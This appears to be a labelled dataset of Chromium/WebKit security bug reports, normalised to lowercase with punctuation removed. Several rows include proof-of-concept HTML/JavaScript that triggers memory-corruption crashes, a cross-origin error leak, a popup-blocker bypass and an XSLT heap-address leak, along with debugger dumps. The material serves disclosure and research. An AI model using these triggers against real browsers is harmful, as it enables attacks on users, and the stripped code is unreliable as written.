78 third_party/webkit/webcore/rendering/counternode.cpp no such file or directory in third_party/webkit/webcore/rendering/counternode.cpp gdb bt 0 in webcore counternode lastdescendant this at third_party/webkit/webcore/rendering/counternode.cpp:78 1 in destroycounternodewithoutmapremoval identifier node at third_party/webkit/webcore/rendering/rendercounter.cpp:354 2 in webcore rendercounter destroycounternodes renderer at third_party/webkit/webcore/rendering/rendercounter.cpp:384 3 in webcore renderobject destroy this at third_party/webkit/webcore/rendering/renderobject.cpp:2166 4 in webcore node detach this at third_party/webkit/webcore/dom/node.cpp:1214 5 in webcore element detach this at third_party/webkit/webcore/dom/element.cpp:877 6 in webcore containernode removebetween this previouschild value optimized out nextchild value optimized out oldchild value optimized out at third_party/webkit/webcore/dom/containernode.cpp:458 7 in webcore containernode removechild this oldchild ec value optimized out at third_party/webkit/webcore/dom/containernode.cpp:435 8 in webcore v8node removechildcallback args type return to continue or q return to quit at third_party/webkit/webcore/bindings/v8/custom/v8nodecustom.cpp:105 9 in handleapicallhelper false args at v8/src/builtins.cc:983 10 builtin_handleapicall args at v8/src/builtins.cc:1000 11 in 12 in 13 in 14 in 15 in 16 in 17 in 18 in 19 in 20 in 21 in 22 in 23 in gdb disassemble dump of assembler code for function znk7webcore11counternode14lastdescendantev 0 mov rdi rax 4 test rax rax 7 jne znk7webcore11counternode14lastdescendantev+19 9 jmp znk7webcore11counternode14lastdescendantev+28 11 nopl rax rax,1 16 mov rdx rax 19 mov rax rdx 23 test rdx rdx 26 jne znk7webcore11counternode14lastdescendantev+16 28 repz retq end of assembler dump gdb i r rax rax 2097152 gdb i r rax 2097152 rbx 140737370441488 rcx 140737370441488 rdx 2097152 rsi 140737373190400 rdi 140737373190400 rbp rsp r8 0 r9 0 r10 1 r11 1 r12 140737012818448 r13 140737373190400 r14 140737373637984 r15 140737012818448 rip webcore counternode lastdescendant const+19 eflags pf if rf cs 51 ss 43 ds 0 es 0 type return to continue or q return to quit fs 0 gs 0 gdb print this 1 wtf refcounted webcore counternode wtf refcountedbase m_refcount 1 wtfnoncopyable noncopyable wtf fastallocbase no data fields no data fields no data fields m_hasresettype false m_value 1 m_countinparent 0 m_renderer m_parent m_previoussibling m_nextsibling m_firstchild m_lastchild gdb info locals lastchild last gdb note that the values of last and lastchild are each	11
stale text node in linebox due to failure to dirty linebox when that text child is dirtied vulnerability details under certain circumstances when removing dom nodes from a dom tree in an html document included on a second page via an iframe chromium will crash caused by a jump to null version chrome version tested in google chrome 8.0.552.237 stable debugging done in chromium 8.0.552.224 ubuntu 10.04 operating system ubuntu 10.04 64-bit reproduction case two files are needed to reproduce this bug both are attached as well as included below the first file outer.html simply creates a iframe with a src of inner.html to reproduce the crash this file should opened in the browser it is shown below html head title crash poc outer title head body iframe width 100 height 100 src inner.html iframe body html the second file inner.html is shown below html head title crash poc inner title head body onload boom audio a audio frame a frame center center font id font font img id img textflow aaaaaaaaaaaaaaaaaaaa bgsound textflow wbr id wbr spot aaa bq aaaaaaaaaaaaa table table bq spot abbr id abbr abbr fieldset id fieldset a fieldset script type text/javascript function reference domnode this.domnode domnode function walk a currentprefix index domnode if domnode null return newprefix currentprefix index walk a currentprefix index 1 domnode.nextsibling walk a newprefix 0 domnode.firstchild a newprefix new reference domnode function clear var a new array walk a 0 document.body for key in a document.body.offsettop a key domnode.parentnode.removechild a key domnode function boom var tn document.getelementbyid font tn.parentnode.removechild tn document.getelementbyid wbr appendchild tn var tn document.getelementbyid fieldset tn.parentnode.removechild tn document.getelementbyid img appendchild tn document.getelementbyid img appendchild document.getelementbyid abbr clonenode false window.settimeout clear 0 script body html the walk and reference functions are helpers for the clear function which removes all nodes under document.body from their parents for crashes please include the following additional information type of crash tab a shortened version of the trace through the program in gdb is included below the full trace is attached chromium-browser debug single-process outer.html env ld_library_path=/usr/lib/chromium-browser path=/usr/lib/chromium-browser usr/local/sbin usr/local/bin usr/sbin usr/bin sbin bin usr/games gtk_path chromium_user_flags chromium_flags usr/bin/gdb usr/lib/chromium-browser/chromium-browser x tmp/chromiumargs.fdgvne gnu gdb gdb 7.1-ubuntu copyright c 2010 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as x86_64-linux-gnu for bug reporting instructions please see reading symbols from usr/lib/chromium-browser/chromium-browser reading symbols from usr/lib/debug/usr/lib/chromium-browser/chromium-browser done done gdb run starting program usr/lib/chromium-browser/chromium-browser single-process outer.html program received signal sigsegv segmentation fault switching to thread lwp 18254 in gdb bt 0 in 1 in webcore renderblock requireslinebox it islineempty=true previouslinebrokecleanly=false at third_party/webkit/webcore/rendering/renderblocklinelayout.cpp:1222 2 in webcore renderblock skipleadingwhitespace this resolver firstline value optimized out islineempty value optimized out previouslinebrokecleanly=false lastfloatfrompreviousline value optimized out at third_party/webkit/webcore/rendering/renderblocklinelayout.cpp:1287 3 in webcore renderblock findnextlinebreak this resolver value optimized out firstline value optimized out islineempty value optimized out previouslinebrokecleanly value optimized out hyphenated clear lastfloatfrompreviousline at third_party/webkit/webcore/rendering/renderblocklinelayout.cpp:1409 4 in webcore renderblock layoutinlinechildren this relayoutchildren value optimized out repaintlogicaltop repaintlogicalbottom at third_party/webkit/webcore/rendering/renderblocklinelayout.cpp:664 5 in webcore renderblock layoutblock this relayoutchildren=false pageheight=0 at third_party/webkit/webcore/rendering/renderblock.cpp:1211 type return to continue or q return to quit trimmed gdb frame 1 1 in webcore renderblock requireslinebox it islineempty=true previouslinebrokecleanly=false at third_party/webkit/webcore/rendering/renderblocklinelayout.cpp:1222 1222 third_party/webkit/webcore/rendering/renderblocklinelayout.cpp no such file or directory in third_party/webkit/webcore/rendering/renderblocklinelayout.cpp gdb disassemble dump of assembler code for function zn7webcore11renderblock15requireslineboxerkns_14inlineiteratorebb 0 mov rbx rsp 5 mov rbp rsp 10 mov rdi rbx 13 mov r12 rsp 18 mov r13 rsp 23 sub rsp 27 mov rdi rdi 31 mov esi r12d 34 mov edx ebp 36 movzbl rdi eax 40 test al 42 jne zn7webcore11renderblock15requireslineboxerkns_14inlineiteratorebb+48 44 test al 46 je zn7webcore11renderblock15requireslineboxerkns_14inlineiteratorebb+80 48 xor ebp ebp 50 mov ebp eax 52 mov rsp rbx 57 mov rsp rbp 62 mov rsp r12 type return to continue or q return to quit 67 mov rsp r13 72 add rsp 76 retq 77 nopl rax 80 mov rdi rax 83 callq rax 89 test al al 91 jne zn7webcore11renderblock15requireslineboxerkns_14inlineiteratorebb+248 97 mov rbx rdi 101 mov rdi rax trimmed gdb i r rax 140737371739072 rbx 140737014790128 rcx 0 rdx 0 rsi 1 rdi 140737370369664 rbp rsp r8 0 r9 0 r10 0 r11 60 r12 1 r13 0 r14 69 r15 0 rip webcore renderblock requireslinebox webcore inlineiterator const bool bool 89 eflags pf zf if rf cs 51 ss 43 ds 0 es 0 type return to continue or q return to quit fs 0 gs 0	11
cross-origin javascript error message leak via worker importscripts vulnerability details splitting out from credit to divricean cc ed here is the repro from the other bug here s another thought on how to get the error message with or without overriding referenceerror these should also be checked html head script type text/javascript var worker new worker worker.js worker.onmessage function e alert e.data worker.onerror function e var msg j for j in e msg j e j n alert msg script head body body html worker.js referenceerror.prototype.__definegetter name function var msg e=this j for j in e if j name msg j e j n postmessage msg importscripts interestingly new worker has to load scripts from the same origin but there is no such restriction in importscripts hence the leak via the worker.onerror method i ve hosted an online demo note that this demo uses some redirectors to try and confuse any origin check we might add so it ll be a good test case to make sure we get redirects correct the standard fix here is to have the onerror handler report simply error with no further details if the error came from a script loaded cross-origin version chrome version everything chrome 8 stable chrome 9 beta dev channel trunk operating system all mine linux x86_64 ubuntu 10.04 reproduction case see above	6
width of boundingclientrect for range with unicode combining characters is corrupted vulnerability details width of boundingclientrect is corrupted strange values possibly segfaulting at high offset version chrome version ubuntu google chrome 8.0.552.237 linux 2.6.35-25-generic 44-ubuntu smp x86_64 gnu/linux chromium 10.0.648.0~svn20110124r72310-0ubuntu1~ucd2~maverick linux 2.6.35-25-generic 44-ubuntu smp x86_64 gnu/linux chromium 10.0.650.0 on ubuntu 32 bit 2.6.35-22 from not affected windows7 32bit chrome stable windows xp 32bit chrome stable reproduction case on 32 bits i ve only gotten it to segfault a couple of times but i consistenly get weird values for length and width in the console such as 2^31 2^32 2^31 or any random number between 100 and 2^32 with single-process i do n't get the combined unicode characters showing up only blank boxes and then i m unable to reproduce gdb stuff is from running with renderer-cmd-prefix='xterm e gdb eval-command=run args span id a a x20d5 a xfe20 a x20d5 a x20d5 a x20d5 a x20d5 a x20d5 x20d5 a x034b span span id b e x0300 a x20da a x20d5 a x20d5 a x20d5 a x20d5 a x20d5 x20d5 a x034b span span id c u x0336 a xfe20 a x20e3 a x20d5 a x20d5 a x20d5 a x20d5 x20d5 a x034b span span id d o x20f5 a xfe20 a x20d5 a x20d5 a x20d5 a x20d5 a x20d5 x20d5 a x034b span script var gotone false var range function uhoh w for var j=1 j 6 j var test document.getelementbyid w firstchild range document.createrange range.setstart test 1 range.setend test j var rect range.getboundingclientrect if rect.width 100 rect.width 0 gotone=true console.log range end j console.log left rect.left console.log width rect.width r=5000 for var i=0 i r i if gotone break var s document.createelement script s.innerhtml uhoh a s.innerhtml uhoh b s.innerhtml uhoh c s.innerhtml uhoh d var body document.getelementbyid a parentelement body.appendchild s script for crashes please include the following additional information type of crash sad tab crash state from var/log/kern.log jan 25 18:41:41 kernel 38107.799633 chromium-browse 32174 segfault at 7fda3683c140 ip 00007fda32366bde sp 00007ffff6323a80 error 4 in chromium-browser 7fda30bf4000+3262000 jan 25 18:41:41 kernel 38107.899078 chromium-browse 32177 segfault at 7fda3683c140 ip 00007fda32366bde sp 00007ffff6323a80 error 4 in chromium-browser 7fda30bf4000+3262000 jan 25 18:41:42 kernel 38107.998958 chromium-browse 32180 segfault at 7fda3683c140 ip 00007fda32366bde sp 00007ffff6323a80 error 4 in chromium-browser 7fda30bf4000+3262000 jan 25 18:45:36 kernel 38341.893436 chromium-browse 32454 segfault at 7f899c61cc80 ip 00007f8998eb2c42 sp 00007fff6a9ffff0 error 4 in chromium-browser 7f8997740000+3262000 jan 25 18:45:39 kernel 38344.396394 chromium-browse 32458 segfault at 7f899c62bc80 ip 00007f8998eb2c42 sp 00007fff6a9ffff0 error 4 in chromium-browser 7f8997740000+3262000 jan 25 18:46:06 kernel 38372.107255 chromium-browse 32489 segfault at 7f899c61cc80 ip 00007f8998eb2c42 sp 00007fff6a9ffff0 error 4 in chromium-browser 7f8997740000+3262000 jan 25 18:46:10 kernel 38375.334760 chrome 32523 segfault at 5758780 ip 00000000019913de sp 00007fff48729840 error 4 in chrome 400000+3126000 jan 25 18:46:16 kernel 38381.688865 chrome 32542 segfault at 5a2c5a0 ip 00000000019913de sp 00007fff48729840 error 4 in chrome 400000+3126000 jan 25 18:46:17 kernel 38382.550059 chrome 32546 segfault at 5679000 ip 00000000019913de sp 00007fff48729760 error 4 in chrome 400000+3126000 jan 25 18:46:17 kernel 38383.090843 chrome 32549 segfault at 5679000 ip 00000000019913de sp 00007fff48729760 error 4 in chrome 400000+3126000 jan 25 18:46:18 kernel 38383.659383 chrome 32552 segfault at 5777780 ip 00000000019913de sp 00007fff48729840 error 4 in chrome 400000+3126000 jan 25 18:46:19 kernel 38384.223206 chrome 32555 segfault at 5777780 ip 00000000019913de sp 00007fff48729840 error 4 in chrome 400000+3126000 gdb program received signal sigsegv segmentation fault in webcore font selectionrectforcomplextext webcore textrun const webcore floatpoint const int int int const webcore font selectionrectforcomplextext webcore textrun const webcore floatpoint const int int int const+382 gdb i r rax 65056 rbx 1 rcx 1024 rdx 68184896 rsi 62224208 rdi 140737488328144 rbp rsp r8 58364792 r9 474 r10 4294967040 r11 0 r12 4294967295 r13 5 r14 140737488328144 r15 140737488329296 rip eflags pf af if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb disas dump of assembler code for function znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii 293 retq 294 jmp znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+304 296 nop 297 nop 298 nop 299 nop 300 nop 301 nop 302 nop 303 nop 304 cmp ebp 307 jne znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+155 313 mov rsp ebp 320 jmpq znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+155 325 jmp znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+328 327 nop 328 test ebx ebx 330 js znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+336 332 test al al 334 jne znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+448 336 mov rsp eax 343 sub eax ebx 345 test r13d r13d 348 js znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+432 350 test dl dl 352 je znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+432 354 cmp r13d eax 357 jbe znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+432 359 mov rsp rax 367 movslq r13d rdx 370 movzwl rax rdx,2 eax 374 mov rsp rdx 382 movss rdx rax,4 xmm0 387 mov rsp rdx 395 cvttss2si xmm0 r12d 400 cmpb rdx 404 je znk7webcore4font27selectionrectforcomplextexterkns_7textrunerkns_10floatpointeiii+112 410 mov rsp rdx 418 mov rdx rax,4 eax 421 sar eax gdb bt 0 in webcore font selectionrectforcomplextext webcore textrun const webcore floatpoint const int int int const 1 in webcore font selectionrectfortext webcore textrun const webcore floatpoint const int int int const 2 in webcore inlinetextbox selectionrect int int int int 3 in webcore rendertext absolutequadsforrange wtf vector webcore floatquad 0ul unsigned int unsigned int bool 4 in webcore range getborderandtextquads wtf vector webcore floatquad 0ul const 5 in webcore range getboundingclientrect const 6 in webcore rangeinternal getboundingclientrectcallback v8 arguments const 7 in 8 in 9 in 10 in valgrind for chromium 979 use of uninitialised value of size 8 979 at webcore font selectionrectforcomplextext webcore textrun const webcore floatpoint const int int int const in home/user/chromium/src/out/release/chrome 979 by webcore font selectionrectfortext webcore textrun const webcore floatpoint const int int int const in home/user/chromium/src/out/release/chrome 979 by webcore inlinetextbox selectionrect int int int int in home/user/chromium/src/out/release/chrome 979 by webcore rendertext absolutequadsforrange wtf vector webcore floatquad 0ul unsigned int unsigned int bool in home/user/chromium/src/out/release/chrome 979 by webcore range getborderandtextquads wtf vector webcore floatquad 0ul const in home/user/chromium/src/out/release/chrome 979 by webcore range getboundingclientrect const in home/user/chromium/src/out/release/chrome 979 by webcore rangeinternal getboundingclientrectcallback v8 arguments const in home/user/chromium/src/out/release/chrome 979 by v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 in home/user/chromium/src/out/release/chrome 979 979 invalid read of size 4 979 at webcore font selectionrectforcomplextext webcore textrun const webcore floatpoint const int int int const in home/user/chromium/src/out/release/chrome 979 by webcore font selectionrectfortext webcore textrun const webcore floatpoint const int int int const in home/user/chromium/src/out/release/chrome 979 by webcore inlinetextbox selectionrect int int int int in home/user/chromium/src/out/release/chrome 979 by webcore rendertext absolutequadsforrange wtf vector webcore floatquad 0ul unsigned int unsigned int bool in home/user/chromium/src/out/release/chrome 979 by webcore range getborderandtextquads wtf vector webcore floatquad 0ul const in home/user/chromium/src/out/release/chrome 979 by webcore range getboundingclientrect const in home/user/chromium/src/out/release/chrome 979 by webcore rangeinternal getboundingclientrectcallback v8 arguments const in home/user/chromium/src/out/release/chrome 979 by v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 in home/user/chromium/src/out/release/chrome 979 address is not stack d malloc d or recently free d 979 979 process terminating with default action of signal 11 sigsegv 979 access not within mapped region at address 979 at webcore font selectionrectforcomplextext webcore textrun const webcore floatpoint const int int int const in home/user/chromium/src/out/release/chrome 979 by webcore font selectionrectfortext webcore textrun const webcore floatpoint const int int int const in home/user/chromium/src/out/release/chrome 979 by webcore inlinetextbox selectionrect int int int int in home/user/chromium/src/out/release/chrome 979 by webcore rendertext absolutequadsforrange wtf vector webcore floatquad 0ul unsigned int unsigned int bool in home/user/chromium/src/out/release/chrome 979 by webcore range getborderandtextquads wtf vector webcore floatquad 0ul const in home/user/chromium/src/out/release/chrome 979 by webcore range getboundingclientrect const in home/user/chromium/src/out/release/chrome 979 by webcore rangeinternal getboundingclientrectcallback v8 arguments const in home/user/chromium/src/out/release/chrome 979 by v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 in home/user/chromium/src/out/release/chrome	9
bypass popup blocker using iframe vulnerability details it is possible to display a popup by using window.open with an iframe scenario 1 iframe src javascript window.open target=_new pop iframe this opens google.com in new tab scenario 2 after searching internet found out that it is possible to force browser to open in a new window rather than in a new tab using height and width attributes of window.open iframe src javascript window.open target=_new pop iframe this pops up google.com in new window version chrome version 10.0.650.0 72593 dev operating system ubuntu 10.04 32 bit popups are successfully blocked in this chrome version chrome version 8.0.552.224 stable operating system ubuntu 10.04 32 bit so it is possible this to happen because of a feature being developed if so please ignore this report reproduction case 1 run attached bypass_pop_iframe1.html for above mentioned scenario 1 2 run attached bypass_pop_iframe2.html for above mentioned scenario 2 other details it happens in third_party/webkit/source/webcore/bindings/v8/scriptcontroller.cpp processingusergesture if sourceurl sourceurl isnull activeproxy timercallback this is the a href javascript window.open case we let it through return true this condition becomes true because sourceurl isnull true when window.open is used with iframe so processingusergesture method returns true even if there is no user gesture	2
use-after-free when document.close and document.write are called after requesting a non-existing script vulnerability details rip 0 valgrind says it s because address is 0 bytes inside a block of size 128 free d version chromium 11.0.656.0 ubuntu 10.10 on ubuntu maverick 64bit 2.6.35-25-generic google chrome 10.0.648.11 dev on ubuntu maverick 64bit 2.6.35-25-generic 8.0.552.237 official build 70801 on windows 7 32-bit reproduction case script src non-existent.js script iframe onload document.close document.write iframe for crashes please include the following additional information type of crash sad tab crash state 0 in 1 in webcore htmlconstructionsite attach webcore element this parent prpchild value optimized out at third_party/webkit/source/webcore/html/parser/htmlconstructionsite.cpp:98 2 in webcore htmlconstructionsite attachtocurrent this child value optimized out at third_party/webkit/source/webcore/html/parser/htmlconstructionsite.cpp:237 3 in webcore htmlconstructionsite inserthtmlelement this token value optimized out at third_party/webkit/source/webcore/html/parser/htmlconstructionsite.cpp:267	11
memory corruption playing back specially crafted ogg vorbis file playing the attached ogg file causes memory corruption in chrome in windbg you will see heap asserts such as these heap chrome.exe heap free heap block 4459140 modified at 44591c4 after it was freed 25cc.2640 wow64 breakpoint code 4000001f first chance first chance exceptions are reported before any exception handling this exception may be expected and handled ntdll32 rtlpbreakpointheap 77ae0aec cc int 3 if you allow the application to continue access violates caused by memory corruption may happen the attached html file repeatedly loads the ogg file in an attempt to force such an av without a debugger nothing appears to happen and chrome seems to continue running just fine besides fixing the bug in ogg playback i think we should make sure that we hook into the heap corruption warnings and immediately terminate the renderer	11
stale continuation flow pointer for continuationoutlinetablemap vulnerability details when performing certain dom operations while quickly switching between documents by setting window.location chromium will crash in webcore renderobject containingblock the crash is usually a null pointer dereference on a call or callq instruction with the narrowed version of the reproduction case but under certain circumstances will crash at a different address or on instruction fetch at null the reproduction case contains two html files crash.html and dummy.html it is possible for a crash to occur if crash.html keeps reloading itself but it is far more reliable when switching between crash.html and dummy.html a raw reproduction case is not included here because in this case it seems to be less reliable than than the narrowed case i was only able to reproduce the crash with the raw case on ubuntu 10.10 32-bit also note that it can take a few seconds for the crash to trigger if you are unable to reproduce the crash using this reproduction case let me know and i will try to find a reliable raw case version tested in chromium 8.0.552.237 ubuntu 10.04 64-bit chromium 8.0.552.237 ubuntu 10.10 32-bit google chrome 9.0.597.84 stable ubuntu 10.04 64-bit and 11.0.659.0 canary build windows vista sp2 64-bit debugging was done with chromium 8.0.552.237 ubuntu 10.04 64-bit reproduction case crash.html html head title webcore renderobject containingblock crash title head body onload boom script type text/javascript function boom table document.createelement table document.body.appendchild table multicol document.createelement multicol multicol.style.outlinestyle ridge multicol.appendchild document.createtextnode yyyyyy range document.createelement range multicol.appendchild range table.appendchild multicol spacer document.createelement spacer q document.createelement q q.style.display list-item range.appendchild q document.body.offsettop range.parentnode.removechild range spacer.insertbefore range spacer.lastchild settimeout window.location dummy.html 50 script body html dummy.html html head title dummy page to facilitate crash title head body onload settimeout window.location crash.html 10 h1 blahblahblah h1 body html for crashes please include the following additional information type of crash tab the following is a shortened version of the trace through the program in gdb the full version as well as the reproduction cases are attached chromium-browser debug single-process crash.html env ld_library_path=/usr/lib/chromium-browser path=/usr/lib/chromium-browser usr/local/sbin usr/local/bin usr/sbin usr/bin sbin bin usr/games gtk_path chromium_user_flags chromium_flags usr/bin/gdb usr/lib/chromium-browser/chromium-browser x tmp/chromiumargs.eadyyu gnu gdb gdb 7.1-ubuntu copyright c 2010 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as x86_64-linux-gnu for bug reporting instructions please see reading symbols from usr/lib/chromium-browser/chromium-browser reading symbols from usr/lib/debug/usr/lib/chromium-browser/chromium-browser done done gdb run program received signal sigsegv segmentation fault switching to thread lwp 3238 in webcore renderobject containingblock this at third_party/webkit/webcore/rendering/renderobject.cpp:622 622 third_party/webkit/webcore/rendering/renderobject.cpp no such file or directory in third_party/webkit/webcore/rendering/renderobject.cpp gdb bt 0 in webcore renderobject containingblock this at third_party/webkit/webcore/rendering/renderobject.cpp:622 1 in webcore renderblock paintcontinuationoutlines this info value optimized out tx=8 ty=8 at third_party/webkit/webcore/rendering/renderblock.cpp:2522 2 in webcore renderblock paintobject this paintinfo tx=8 ty=8 at third_party/webkit/webcore/rendering/renderblock.cpp:2404 3 in webcore renderblock paint this paintinfo tx=8 ty=8 at third_party/webkit/webcore/rendering/renderblock.cpp:2144 4 in webcore renderblock paintchildren this paintinfo tx value optimized out ty=8 at third_party/webkit/webcore/rendering/renderblock.cpp:2295 5 in webcore renderblock paintobject this paintinfo tx=8 ty=8 at third_party/webkit/webcore/rendering/renderblock.cpp:2362 6 in webcore renderblock paint this paintinfo tx=8 ty=8 gdb disassemble dump of assembler code for function znk7webcore12renderobject15containingblockev 0 push rbp 1 mov rdi rbp 4 push rbx 5 sub rsp 9 mov rbp rax 13 mov rbp rdi 16 callq rax 22 test al al 24 jne znk7webcore12renderobject15containingblockev+552 30 mov rbp rax 34 mov rbp rdi 37 callq rax 43 test al al 45 jne znk7webcore12renderobject15containingblockev+600 51 testb rbp 55 mov rbp rbx 59 jne znk7webcore12renderobject15containingblockev+80 61 nopl rax type return to continue or q return to quit q quit gdb i r rax 0 rbx 8 rcx 140737370265616 rdx 140737371585680 rsi 140737014676128 rdi 140737370265920 rbp rsp r8 63 r9 5 r10 8 r11 174 r12 140737370265616 r13 140737417274384 r14 140737370265920 r15 140737409624832 rip webcore renderobject containingblock const+16 eflags pf if rf cs 51 ss 43 ds 0 es 0 type return to continue or q return to quit fs 0 gs 0 gdb though the above is the usual case for a crash as mentioned previously it will occasionally crash on instruction fetch the following shows an example of that on ubuntu 10.10 32-bit program received signal sigsegv segmentation fault switching to thread lwp 2042 in gdb frame 1 1 in webcore renderobject containingblock this at third_party/webkit/webcore/rendering/renderobject.cpp:622 622 third_party/webkit/webcore/rendering/renderobject.cpp no such file or directory in third_party/webkit/webcore/rendering/renderobject.cpp gdb disas dump of assembler code for function webcore renderobject containingblock const 0 push ebp 1 mov esp ebp 3 push edi 4 push esi 5 sub esp 8 mov ebp edi 11 mov edi eax 13 mov edi esp 16 call eax 22 test al al	11
dereference poisoned value in avcodec_52 ff_thread_decode_frame what steps will reproduce the problem 1 open 2 av 3 what is the expected output what do you see instead 2:018 lastevent last event c2c.c24 access violation code c0000005 first chance debugger time tue feb 15 17:23:38.291 2011 gmt+1 2:018 r eax=02530b4b ebx=01439ac0 ecx=baadf00d edx=01439ac0 esi=0143dce0 edi=01439ac0 eip=6addc244 esp=0197fba0 ebp=00000000 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 avcodec_52 ff_thread_decode_frame 6addc244 898100010000 mov dword ptr ecx+100h eax ds:0023 baadf10d 2:018 kv childebp retaddr args to child warning stack unwind information not available following frames may be wrong 00000000 00000000 00000000 00000000 00000000 avcodec_52 ff_thread_decode_frame please use labels and text to provide additional information testcase attached in case it disappears	11
crash due to bad cast to rendertextfragment in updatefirstletter vulnerability details rip 0 with dd dir tags and designmode version chromium 11.0.672.0 ubuntu 10.10 linux 2.6.35-26-generic 46-ubuntu smp sun jan 30 06:59:07 utc 2011 x86_64 google chrome 9.0.597.98 linux 2.6.35-26-generic 46-ubuntu smp sun jan 30 06:59:07 utc 2011 x86_64 google chrome 9.0.597.98 official build 74359 windows 7 32bit reproduction case attached there are a bunch of nullpointerish repros the html is similar but they segfault at different offsets then there s a longer repro that jumps to 0 with chromium and 7 with chrome on linux for crashes please include the following additional information type of crash tab crash state gdb bt 5 0 in 1 in webcore inlineflowbox deleteline this arena at third_party/webkit/source/webcore/rendering/inlineflowbox.cpp:127 2 in webcore renderblock layoutinlinechildren this relayoutchildren value optimized out repaintlogicaltop repaintlogicalbottom	11
leak of address of heap object via xslt generate-id function transform any xml file with this xslt xml version 1.0 encoding utf-8 xsl stylesheet version 1.0 xmlns xsl xsl template match xsl for-each select foo out xsl value-of select generate-id out xsl for-each xsl template xsl stylesheet or visit you ll see something like id3365100 that numeric value if multiplied by the compiler-dependent sizeof xmlnode is the raw heap address of an xmlnode object not so good for aslr	7
dev console null character crash history urldatabase getmostrecentkeywordsearchterms chrome version 9.0.597.94 under win7 urls if applicable n/a other browsers tested add ok or fail after other browsers where you have tested this issue firefox 3.x ok what steps will reproduce the problem 1 open up a blank tab or any tab for that matter 2 press ctrl shift j to bring up the dev console 3 paste in the following console.log string.fromcharcode 0 test 4 this should ouput the word test select the whole line that says test make sure that your cursor goes a little to the left of the word when you select it 5 now right click on your selected word what is the expected result context menu with option to copy it what happens instead crash please provide any additional information below attach a screenshot if possible this is caused by the null character ascii 0 that was concatenated at the beginning of the string it works fine if the null character is at the end or in the middle of it asked two other friends to test it under the same platform both browser and os as me same results	11
use after free of frame loader in documentloader commitload looks like null ptr deref but i m not sure and it try to read not null address for safety i used security template crashes on linux 32-bit stable 9.0.597.98 74359 and dev 10.0.648.45 74092 repro file crash1.html script function main window.document.body outerhtml foo window.onload main script iframe src data application/pdf foobar i tried other mime types but crashes only using application/pdf program received signal sigsegv segmentation fault switching to thread lwp 6940 in wtf refptr webcore document get this loader data foobar length=6 at third_party/webkit/source/javascriptcore/wtf/refptr.h:60 60 t get const return m_ptr 0 in wtf refptr webcore document get this loader data foobar length=6 at third_party/webkit/source/javascriptcore/wtf/refptr.h:60 1 webcore frame document this loader data foobar length=6 at third_party/webkit/source/webcore/page/frame.h:298 2 webkit frameloaderclientimpl committedload this loader data foobar length=6 at third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1072 3 in webcore documentloader commitload this data foobar length=6 at third_party/webkit/source/webcore/loader/documentloader.cpp:295 4 in webcore mainresourceloader adddata this data foobar length=6 allatonce value optimized out at third_party/webkit/source/webcore/loader/mainresourceloader.cpp:157 5 in webcore resourceloader didreceivedata this data foobar length=6 lengthreceived value optimized out allatonce value optimized out at third_party/webkit/source/webcore/loader/resourceloader.cpp:277 6 in webcore mainresourceloader didreceivedata this data foobar length=6 lengthreceived=0 allatonce=false at third_party/webkit/source/webcore/loader/mainresourceloader.cpp:442 7 in webcore resourceloader didreceivedata this data foobar length=6 lengthreceived=6 at third_party/webkit/source/webcore/loader/resourceloader.cpp:428 8 in webcore resourcehandleinternal didreceivedata this data foobar datalength=6 at third_party/webkit/source/webkit/chromium/src/resourcehandle.cpp:173 9 in webkit_glue weburlloaderimpl context onreceiveddata this data foobar len=6 at webkit/glue/weburlloader_impl.cc:612 10 in resourcedispatcher onreceiveddata this message request_id=24 shm_handle data_len=6 at chrome/common/resource_dispatcher.cc:372 11 in ipc messagewithtuple tuple3 int base filedescriptor int dispatch resourcedispatcher resourcedispatcher int base filedescriptor int msg obj sender func resourcedispatcher onreceiveddata ipc message const int base filedescriptor int at ipc/ipc_message_utils.h:965 12 in resourcedispatcher dispatchmessage this message at chrome/common/resource_dispatcher.cc:528 13 in resourcedispatcher onmessagereceived this message at chrome/common/resource_dispatcher.cc:297 14 in childthread onmessagereceived this msg at chrome/common/child_thread.cc:144 eax 0 ecx 0 edx 420 ebx 49673004 esp ebp esi 60190152 edi 1329217536 eip webkit frameloaderclientimpl committedload webcore documentloader char const int 49 eflags sf if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51 dump of assembler code for function zn6webkit21frameloaderclientimpl13committedloadepn7webcore14documentloaderepkci 0 push ebp 1 mov esp ebp 3 push edi 4 push esi 5 push ebx 6 sub esp 9 mov ebp esi 12 call i686.get_pc_thunk.bx 17 add ebx 23 mov ebp edi 26 mov esi eax 32 test eax eax 34 je zn6webkit21frameloaderclientimpl13committedloadepn7webcore14documentloaderepkci+408 40 mov esi eax 43 mov eax eax 49 mov eax eax 55 mov eax edx 57 mov eax esp 60 call edx full backtrace attached bt1.txt	11
